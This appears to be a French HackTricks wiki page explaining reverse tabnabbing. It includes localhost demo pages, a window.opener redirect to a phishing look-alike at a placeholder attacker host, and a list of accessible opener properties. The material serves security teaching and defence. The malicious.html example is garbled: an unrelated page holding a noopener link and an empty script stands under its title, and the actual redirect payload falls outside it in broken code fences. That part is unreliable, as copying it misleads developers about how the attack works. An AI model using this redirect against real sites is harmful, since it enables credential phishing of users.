{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# Description

Dans une situation o√π un **attaquant** peut **contr√¥ler** l'argument **`href`** d'une balise **`<a`** avec l'attribut **`target="_blank" rel="opener"`** qui va √™tre cliqu√©e par une victime, l'**attaquant** **dirige** ce **lien** vers un site web sous son contr√¥le (un **site** **malveillant**). Ensuite, une fois que la **victime clique** sur le lien et acc√®de au site de l'attaquant, ce **site** **malveillant** pourra **contr√¥ler** la **page** **originale** via l'objet javascript **`window.opener`**.\
Si la page n'a pas **`rel="opener"` mais contient `target="_blank"` et n'a pas `rel="noopener"`**, elle peut √©galement √™tre vuln√©rable.

Une mani√®re classique d'abuser de ce comportement serait de **changer la localisation du web original** via `window.opener.location = https://attacker.com/victim.html` vers un web contr√¥l√© par l'attaquant qui **ressemble √† l'original**, afin qu'il puisse **imiter** le **formulaire** de **connexion** du site web original et demander des identifiants √† l'utilisateur.

Cependant, notez qu'√©tant donn√© que l'**attaquant peut maintenant contr√¥ler l'objet window du site web original**, il peut en abuser de d'autres mani√®res pour effectuer des **attaques plus discr√®tes** (peut-√™tre en modifiant des √©v√©nements javascript pour exfiltrer des informations vers un serveur qu'il contr√¥le ?)

# Overview

## With back link

Lien entre les pages parent et enfant lorsque l'attribut de pr√©vention n'est pas utilis√© :

![https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITH_LINK.png](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITH\_LINK.png)

## Without back link

Lien entre les pages parent et enfant lorsque l'attribut de pr√©vention est utilis√© :

![https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITHOUT_LINK.png](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITHOUT\_LINK.png)

## Examples <a href="#examples" id="examples"></a>

Cr√©ez les pages suivantes dans un dossier et ex√©cutez un serveur web avec `python3 -m http.server`\
Ensuite, **acc√©dez** √† `http://127.0.0.1:8000/`vulnerable.html, **cliquez** sur le lien et notez comment l'**URL** du **site** **original** **change**.

{% code title="vulnerable.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>Victim Site</h1>
<a href="http://127.0.0.1:8000/malicious.html" target="_blank" rel="opener">Controlled by the attacker</a>
</body>
</html>
```
{% endcode %}

{% code title="malicious.html" %}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reverse Tab Nabbing</title>
</head>
<body>
    <a href="https://example.com" target="_blank" rel="noopener noreferrer">Click me!</a>
    <script>
        // This script is used to demonstrate reverse tab nabbing
        window.addEventListener('focus', function() {
            // Code to execute when the tab is focused
        });
    </script>
</body>
</html>
{% endcode %}
```markup
<!DOCTYPE html>
<html>
<body>
<script>
window.opener.location = "http://127.0.0.1:8000/malicious_redir.html";
</script>
</body>
</html>
```
{% endcode %}

{% code title="malicious_redir.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>New Malicious Site</h1>
</body>
</html>
```
{% endcode %}

## Propri√©t√©s accessibles <a href="#accessible-properties" id="accessible-properties"></a>

Dans le sc√©nario o√π un acc√®s **cross-origin** se produit (acc√®s entre diff√©rents domaines), les propri√©t√©s de l'instance de la classe JavaScript **window**, r√©f√©renc√©es par l'objet JavaScript **opener**, auxquelles un site malveillant peut acc√©der sont limit√©es aux suivantes :

- **`opener.closed`** : Cette propri√©t√© est utilis√©e pour d√©terminer si une fen√™tre a √©t√© ferm√©e, renvoyant une valeur bool√©enne.
- **`opener.frames`** : Cette propri√©t√© fournit l'acc√®s √† tous les √©l√©ments iframe dans la fen√™tre actuelle.
- **`opener.length`** : Le nombre d'√©l√©ments iframe pr√©sents dans la fen√™tre actuelle est renvoy√© par cette propri√©t√©.
- **`opener.opener`** : Une r√©f√©rence √† la fen√™tre qui a ouvert la fen√™tre actuelle peut √™tre obtenue par cette propri√©t√©.
- **`opener.parent`** : Cette propri√©t√© renvoie la fen√™tre parente de la fen√™tre actuelle.
- **`opener.self`** : L'acc√®s √† la fen√™tre actuelle elle-m√™me est fourni par cette propri√©t√©.
- **`opener.top`** : Cette propri√©t√© renvoie la fen√™tre de navigateur la plus haute.

Cependant, dans les cas o√π les domaines sont identiques, le site malveillant a acc√®s √† toutes les propri√©t√©s expos√©es par la r√©f√©rence d'objet JavaScript [**window**](https://developer.mozilla.org/en-US/docs/Web/API/Window).

# Pr√©vention

Les informations de pr√©vention sont document√©es dans le [HTML5 Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5\_Security\_Cheat\_Sheet.html#tabnabbing).

## R√©f√©rences

* [https://owasp.org/www-community/attacks/Reverse_Tabnabbing](https://owasp.org/www-community/attacks/Reverse_Tabnabbing)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
